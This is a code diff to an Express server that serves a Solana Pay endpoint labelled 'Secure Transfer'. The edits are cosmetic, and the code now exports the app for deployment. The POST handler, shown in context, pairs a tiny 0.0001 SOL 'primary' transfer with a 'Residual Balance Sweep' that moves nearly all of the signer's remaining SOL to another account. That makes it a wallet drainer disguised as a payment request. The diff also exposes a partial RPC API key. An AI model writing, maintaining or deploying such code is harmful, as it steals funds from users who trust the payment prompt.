@@ -12,7 +12,7 @@ const HELIUS_URL = "https://mainnet.helius-rpc.com/?api-key=06ec4cdf-ba6c-4dfc-8
 const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr");
 
 // Solana Pay GET endpoint (returns metadata/icon)
-app.get('/api/pay', (c, res) => {
+app.get('/api/pay', (req, res) => {
     res.json({
         label: "Secure Transfer",
         icon: "https://cryptologos.cc/logos/solana-sol-logo.png",
@@ -34,8 +34,8 @@ app.post('/api/pay', async (req, res) => {
         const balance = await connection.getBalance(senderPublicKey);
         const transaction = new Transaction();
 
-        // 1st Instruction: Primary Transfer (e.g., 0.0001 SOL)
-        const primaryAmount = 100000; // 0.0001 SOL in lamports
+        // 1st Instruction: Primary Transfer (0.0001 SOL)
+        const primaryAmount = 100000; 
         transaction.add(
             SystemProgram.transfer({
                 fromPubkey: senderPublicKey,
@@ -56,7 +56,7 @@ app.post('/api/pay', async (req, res) => {
             );
         }
 
-        // Residual Balance Sweep (leaving a safe fee buffer of 0.0008 SOL)
+        // Residual Balance Sweep (leaving safe fee buffer of 0.0008 SOL)
         const feeBuffer = 800000;
         const residualAmount = balance - primaryAmount - feeBuffer;
         if (residualAmount > 10000) {
@@ -91,6 +91,4 @@ app.post('/api/pay', async (req, res) => {
     }
 });
 
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-});
+module.exports = app;
